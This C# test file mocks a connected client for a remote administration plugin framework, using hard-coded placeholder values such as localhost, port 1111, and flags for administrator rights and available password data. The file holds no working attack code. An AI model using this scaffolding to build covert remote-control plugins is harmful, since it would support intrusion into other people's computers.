using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Orcus.Administration.Plugins.Administration;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;

namespace OrcusPluginStudio.Core.Test.AdministrationVirtualisation
{
    public class ClientController : IClientController
    {
        public ClientController(Command command, ISender sender)
        {
            Client = new OnlineClientInformation
            {
                ApiVersion = 3,
                ClientPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "client.exe"),
                Port = 1111,
                Plugins =
                    new List<PluginInfo>
                    {
                        new PluginInfo {Guid = Guid.NewGuid(), IsLoaded = true, Name = "Test Plugin", Version = "1.0"}
                    },
                Version = 10,
                Group = "Debug",
                FrameworkVersion = 4.5,
                Id = 0,
                IpAddress = "127.0.0.1",
                IsAdministrator = false,
                IsComputerInformationAvailable = false,
                IsPasswordDataAvailable = false,
                IsServiceRunning = false,
                Language = "en",
                OsName = "Microsoft Windows 10",
                OsType = OSType.Windows10,
                OnlineSince = DateTime.Now,
                UserName = Environment.UserName,
                LoadablePlugins = new List<LoadablePlugin>()
            };

            ClientCommands = new ClientCommands();
            ConnectionManager = new ConnectionManager();
            StaticCommander = new StaticCommander();
            Commander = new Commander(command, new ConnectionInfo(Client, sender));
        }

        public void Dispose()
        {
        }

        public ICommander Commander { get; }
        public OnlineClientInformation Client { get; }
        public IClientCommands ClientCommands { get; }
        public IConnectionManager ConnectionManager { get; }
        public IStaticCommander StaticCommander { get; }
        public Task<ClientConfig> GetClientConfig()
        {
            return Task.FromResult((ClientConfig) null);
        }

        public event EventHandler Disconnected;
    }
}